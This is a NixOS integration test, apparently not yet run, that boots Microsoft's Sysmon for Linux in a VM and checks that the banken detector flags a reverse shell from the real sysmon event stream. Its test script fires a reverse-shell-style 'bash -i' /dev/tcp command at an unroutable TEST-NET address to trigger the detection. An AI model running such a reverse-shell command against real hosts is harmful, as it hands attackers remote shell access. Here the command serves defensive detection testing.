# LIVE end-to-end proof of the Sysmon-for-Linux source: a VM that runs MICROSOFT'S REAL
# sysmonforlinux (eBPF, kernel BTF) and shows banken detecting a reverse shell off that real stream.
# This is the test tests/sysmon-switch.nix could not be: that one INJECTS a Sysmon-shaped record
# because the MS binary was unpackaged. Here the record is produced by sysmon itself. No injection.
#
#   nix-build tests/sysmon-live.nix --no-out-link      (needs KVM + a BTF-enabled guest kernel)
#
# What it proves, link by link:
#   kernel BTF present  ->  real sysmon loads its eBPF and emits ProcessCreate to the journal
#   ->  banken's journal bridge (services.banken.sysmon.enable) tails it as a `sysmon` source
#   ->  a reverse-shell exec by a normal user becomes a reverse_shell Detection Finding
#       with data_sources == ["sysmon"], AND that exec is visible in sysmon's OWN output (provenance).
# Audit is OFF, so `sysmon` is banken's only source: the alert can only have come off the real stream.
#
# ----------------------------------------------------------------------------------------------
# !! NOT YET RUN -- BLOCKED ON EGRESS (Taskwarrior 1188, +conor) !!
# This test is written and ready but has NOT passed, because pkgs/sysmonforlinux cannot be built
# until packages.microsoft.com egress is opened on hokkaido (see that package's header). Do NOT add a
# Sysmon-for-Linux README support line until this test PASSES live. A couple of runtime details below
# (sysmon's exact daemon invocation and its /opt resource lookup) are from Microsoft's documented
# behaviour and may need a small adjustment on the first real run; they are flagged inline.
# ----------------------------------------------------------------------------------------------
{ pkgs ? import <nixpkgs> { }
, banken ? pkgs.callPackage ../package.nix { }
, sysmon ? pkgs.callPackage ../pkgs/sysmonforlinux { }
}:

let
  lib = pkgs.lib;

  # Minimal Linux Sysmon config: capture ProcessCreate (EventID 1), nothing else, so the stream is
  # small and the reverse-shell exec is easy to find.
  sysmonConfig = pkgs.writeText "sysmonconfig.xml" ''
    <Sysmon schemaversion="4.81">
      <EventFiltering>
        <RuleGroup name="procs" groupRelation="or">
          <ProcessCreate onmatch="include" />
        </RuleGroup>
      </EventFiltering>
    </Sysmon>
  '';
in
pkgs.testers.runNixOSTest {
  name = "banken-sysmon-live";

  nodes.machine = { config, pkgs, lib, ... }: {
    imports = [ ../module.nix ];

    # Real sysmon needs eBPF + the kernel's own BTF; KVM provides it, as the mimi switch test relies
    # on. Load the eBPF JIT / BPF syscall surface explicitly so a stripped test kernel still works.
    boot.kernel.sysctl."kernel.unprivileged_bpf_disabled" = lib.mkForce 0;
    virtualisation.memorySize = 2048;

    # sysmon and libsysinternalsEBPF.so do a fixed-path lookup of their eBPF objects + offsets DB at
    # /opt/sysinternalsEBPF. Present the package's copy there (read-only symlink); no path rewriting.
    systemd.tmpfiles.rules = [
      "L+ /opt/sysinternalsEBPF - - - - ${sysmon.passthru.ebpfResourceDir}"
    ];

    # Run the REAL Microsoft sysmon as `sysmon.service` -- the unit name banken's module already
    # orders after. It forks to a daemon and logs ProcessCreate events to syslog, which on this
    # journald-only host land in the journal under identifier "sysmon" (what the bridge tails).
    # NOTE(first real run): confirm the daemon invocation. `sysmon -accepteula -i <cfg>` is the
    # installer; the long-running daemon it installs runs the binary against that config. If the
    # binary does not stay in foreground with the args below, switch to Type=forking or use the
    # installer in an ExecStartPre and let sysmon's own unit run.
    systemd.services.sysmon = {
      description = "Microsoft Sysmon for Linux (real eBPF sensor)";
      wantedBy = [ "multi-user.target" ];
      after = [ "systemd-journald.service" ];
      path = [ pkgs.kmod ];
      serviceConfig = {
        Type = "simple";
        ExecStartPre = "${sysmon}/bin/sysmon -accepteula -c ${sysmonConfig}";
        ExecStart = "${sysmon}/bin/sysmon -i ${sysmonConfig}";
        Restart = "on-failure";
        RestartSec = 2;
      };
    };

    services.banken = {
      enable = true;
      package = banken;
      alerts.jsonl = { enable = true; format = "ocsf"; };
      # THE switch under test: follow the real sysmon stream via the journal bridge.
      sysmon.enable = true;
      # sysmon (via the bridge) is then banken's ONLY source: an alert proves it came off that stream.
      audit.enable = false;
    };
    # The daemon starts at boot (sensor on); no timer.
    systemd.timers.banken.wantedBy = lib.mkForce [ ];

    users.users.alice.isNormalUser = true;
    environment.systemPackages = with pkgs; [ sysmon bashInteractive coreutils procps ];
  };

  testScript = ''
    import json, time

    # 1) The guest kernel must expose BTF, or real sysmon's eBPF cannot load. Assert it outright.
    machine.wait_for_unit("multi-user.target")
    machine.succeed("test -e /sys/kernel/btf/vmlinux")
    print("BTF present: /sys/kernel/btf/vmlinux")

    # 2) Real sysmon is up, and banken is the continuous daemon following the bridged sysmon source.
    machine.wait_for_unit("sysmon.service")
    machine.wait_for_unit("banken-sysmon-journal.service")
    machine.wait_for_unit("banken.service")
    machine.succeed("systemctl show -p ExecStart banken.service | grep -- --watch")

    # 3) Wait until REAL sysmon has emitted at least one ProcessCreate to the journal under "sysmon"
    #    (proof the eBPF sensor is live before we trigger the test exec).
    machine.wait_until_succeeds("journalctl -t sysmon -o cat | grep -q '<EventID>1</EventID>'", timeout=120)
    print("real sysmon is emitting ProcessCreate events")

    def alerts():
        out = machine.succeed("cat /var/log/banken/alerts-*.jsonl 2>/dev/null || true")
        return [json.loads(l) for l in out.splitlines() if l.strip()]

    # 4) Trigger a reverse-shell-shaped exec as a NORMAL user. 192.0.2.30 is TEST-NET-1 (RFC5737):
    #    unroutable, so nothing connects; the exec -- the attempt sysmon records -- is what matters.
    #    A unique port ties the sysmon record and the banken alert back to THIS exec.
    port = "47123"
    before = len(alerts())
    t0 = time.monotonic()
    loginpath = "/run/wrappers/bin:/run/current-system/sw/bin:/usr/bin:/bin"
    machine.succeed(
        f"runuser -u alice -- env PATH={loginpath} "
        f"timeout 2 bash -i -c 'exec 3<>/dev/tcp/192.0.2.30/{port}' >/dev/null 2>&1 || true"
    )

    # 5) banken must raise reverse_shell off the real sysmon stream, referencing this port.
    hit = None
    for _ in range(600):  # up to ~30s (eBPF -> journal -> bridge -> banken tail)
        for a in alerts()[before:]:
            if port in json.dumps(a):
                hit = a
                break
        if hit:
            break
        time.sleep(0.05)
    latency_ms = (time.monotonic() - t0) * 1000
    assert hit, f"no banken alert referencing port {port} within 30s (real-sysmon -> banken path broke)"

    assert hit["class_uid"] == 2004 and hit["metadata"]["version"] == "1.3.0", hit
    name = hit["finding_info"]["analytic"]["name"]
    assert name == "reverse_shell", f"fired {name!r}, expected reverse_shell"
    # The provenance banken stamps on the finding: it came off the sysmon source, nothing else.
    ds = hit["finding_info"].get("data_sources")
    assert ds == ["sysmon"], f"data_sources = {ds!r}, expected ['sysmon'] (real sysmon was the only source)"

    # 6) Provenance of the trigger itself: the exec is visible in sysmon's OWN output (the journal it
    #    produced and the bridge file banken tailed both carry this ProcessCreate's /dev/tcp line).
    machine.succeed(f"journalctl -t sysmon -o cat | grep -q '/dev/tcp/192.0.2.30/{port}'")
    machine.succeed(f"grep -q '/dev/tcp/192.0.2.30/{port}' /var/log/banken-sysmon/sysmon.log")

    print(f"SYSMON LIVE PROOF PASS: Microsoft sysmonforlinux emitted a ProcessCreate that banken "
          f"detected as reverse_shell (data_sources=['sysmon']) off the REAL stream; "
          f"exec->alert {latency_ms:.0f} ms. No injection.")
  '';
}
